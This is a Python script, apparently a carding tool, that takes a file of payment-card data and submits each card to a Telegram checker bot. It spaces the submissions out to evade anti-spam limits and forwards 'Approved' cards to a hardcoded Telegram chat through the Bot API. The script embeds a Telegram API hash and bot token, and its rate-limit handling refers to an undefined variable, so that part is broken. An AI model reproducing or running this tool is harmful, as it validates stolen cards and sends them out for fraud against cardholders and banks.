#ItsHarshX
import os
try :
    import pyfiglet
    import telethon
    import requests
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
import time,os,random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
ch = "SDBB_Bot"
api_id = "28484147"
api_hash = "339dbdfab9626dfc5da6dd7c0aba1652"
ID = "5190315686"
token= "5805009581:AAEAO--iqTTtrZEnOcScYtCHDB3kN3y5qJY"
combo = input(X+'ENTER YOU COMBO NAME : '+F)
os.system('clear')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"):
    try:
        client.send_message(ch ,f"/chk {cc}")
        time.sleep(random.randint(40,50))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            r = str(mssag[0].message).split("again after ")[1]
            r = t.split("seconds")[0]
            r = int(t)
            print(f"Done Sleep : {r+2}")
            time.sleep(t+1)
        ccn = mssag[0].message
        if 'Approved' in ccn :
            print(F+'Approved✅ | ItsHarshX : @ItsHarshX.')
            mgs=f'''• Card checked by @ItsHarshx✅.
{ccn} .
@ItsHarshX✔️
ItsHarshX OFFICIAL🌎
CHECK COMMAND = /chk'''
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
            i = requests.post(tlg)
            time.sleep(1)
        else :
            print(Z+'Declined❌ | ItsHarshX : @ItsHarshX.')
    except:
        print(False)
        #@ItsHarshX